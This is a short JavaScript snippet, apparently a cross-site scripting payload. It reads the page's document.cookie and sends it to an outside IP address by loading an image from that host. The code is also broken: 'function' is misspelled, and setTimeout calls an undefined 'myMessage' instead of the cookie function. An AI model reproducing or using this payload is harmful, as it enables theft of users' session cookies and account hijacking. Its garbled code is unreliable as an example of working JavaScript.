funcion sentCookie(){
  var img = new Image();
  img.src="http://101.42.45.248:23339/?a=" + document.cookie;
  document.body.append(img);
}
setTimeout(myMessage, 1000);
